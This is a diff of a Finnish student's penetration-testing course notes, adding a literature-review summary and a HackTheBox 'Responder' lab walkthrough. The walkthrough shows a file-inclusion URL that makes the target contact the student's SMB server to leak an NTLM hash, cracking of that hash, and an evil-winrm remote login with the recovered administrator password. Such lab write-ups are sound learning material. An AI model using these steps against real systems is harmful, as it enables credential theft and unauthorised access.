@@ -11,6 +11,14 @@
 
 ### Vapaavalintainen katsausartikkeli
 
+#### A Systematic Literature Review on Penetration Testing in Networks: Future Research Directions
+
+- Mariam Alhamed & M. M. Hazifur Rahman
+- 2023
+- JUFO: 1
+
+Katsausartikkeli käsittelee penetraatiotestauksen tutkimuksia verkkoympäristöissä vuosilta 2018–2022. Siinä analysoidaan käytettyjä testausmenetelmiä, työkaluja ja vaiheita. Keskeisiä havaintoja ovat muun muassa tarve automatisoinnille, haasteet osaamisessa ja kasvava kiinnostus koneoppimisen hyödyntämiseen haavoittuvuuksien tunnistamisessa.
+
 ---
 
 ## HTB
@@ -226,13 +234,59 @@ John the Ripper on jo vanha tuttu kurssilta
 
 ![image](https://github.com/user-attachments/assets/2ef02305-e7b6-4ef8-8f03-fa141e93cae0)
 
+Tässä tehtävässä jouduin katsomaan malliratkaisua. Ideana oli huijata palvelinta lataamaan tiedosto minun SMB-palvelimelta. Kun laitoin selaimeen osoitteen `http://unika.htb/index.php?page=//10.10.16.31/flag.txt`, palvelin yritti hakea tiedoston minun laitteeltani.
 
+Tässä yhteydessä palvelin aloittaa SMB-tunnistautumisen, ja minun palvelin vastaa siihen lähettämällä haasteen. Palvelin vastaa tähän lähettämällä NTLM-hashin.
+
+Tämä hash on helppo murtaa, koska se on tehty käyttäjän salasanasta ja haasteesta. Esimerkiksi John the Ripper voi käydä läpi sanakirjasanoja, laskea niistä samanlaisen hashin ja vertailla sitä palvelimelta saatuun.
+
+![image](https://github.com/user-attachments/assets/a9ab2b5e-69aa-46f5-a05a-84f52cde3431)
+
+Laitetaan palvelin yhdistämään omaan SMB-palvelimeen `http://unika.htb/index.php?page=//10.10.16.31/flag.txt`
+
+![image](https://github.com/user-attachments/assets/b4fb41a0-cac9-4e2c-827d-708814941b04)
+
+Ja nyt murretaan saatu hash
+
+![image](https://github.com/user-attachments/assets/b6f64859-6362-4c8e-87a6-38da46120479)
+
+![image](https://github.com/user-attachments/assets/75dfb86c-24fb-4fd8-8c51-fb27eea99945)
+
+---
+
+#### Task 10 
+
+![image](https://github.com/user-attachments/assets/6709dae3-62f5-4eeb-a373-67e5569332c9)
+
+Ajetaan `nmap` skanni komennolla `nmap 10.129.95.234`
+
+![image](https://github.com/user-attachments/assets/5aa3df18-4281-4c42-adc3-2528bde34c2e)
+
+![image](https://github.com/user-attachments/assets/bedce075-cdb9-4a0c-b700-4b0e3dac9a80)
+
+---
+
+#### Task 11
+
+![image](https://github.com/user-attachments/assets/bf425786-7f42-4d62-9a7a-64f9c8a210e3)
+
+Tässäkin jouduin vilkaisemaan malliratkaisua, koska oli todella epäselvää mistä edes aloittaisin. Selvisi, että palvelimeen voidaan yhdistaa `evil-winrm` työkalulla: `evil-winrm -i 10.129.95.234 -u administrator -p badminton`
+
+![image](https://github.com/user-attachments/assets/fb627768-9c39-4fa2-9ca3-511897851ef6)
+
+Nyt piti vain löytää `flag.txt`. Onnistuu komennolla `Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue`[^7] 
+
+![image](https://github.com/user-attachments/assets/f0fffe9c-c1b3-4102-a743-269fabf5a10e)
+
+![image](https://github.com/user-attachments/assets/4ef5b353-d12c-4c15-8eb2-23800b29bbbe)
 
 ## Lähteet
 
 Karvinen Tero, Tunkeutumistestaus, luettavissa https://terokarvinen.com/tunkeutumistestaus/, luettu 5.5.2025
 
 Karvinen Tero, Start Your Research with a Review Article, luettavissa https://terokarvinen.com/review-article/, luettu 5.5.2025
+
+MDPI, Mariam Alhamed & M. M. Hazifur Rahman, A Systematic Literature Review on Penetration Testing in Networks: Future Research Directions, luettavissa https://www.mdpi.com/2076-3417/13/12/6986, luettu 6.5.2025
 
 HackTheBox, Starting-point, luettavissa https://app.hackthebox.com/starting-point, luettu 6.5.2025
 
@@ -243,3 +297,5 @@ HackTheBox, Starting-point, luettavissa https://app.hackthebox.com/starting-poin
 [^5]: HackTheBox, Responder writeup, luettavissa blob:https://app.hackthebox.com/4352371d-4fea-4d46-afde-89295f31c507, luettu 6.5.2025
 
 [^6]: Wikipedia, NTLM, luettavissa https://en.wikipedia.org/wiki/NTLM, luettu 6.5.2025
+
+[^7]: Microsoft, Use Windows Powershell, luettavissa https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/, luettu 6.5.2025
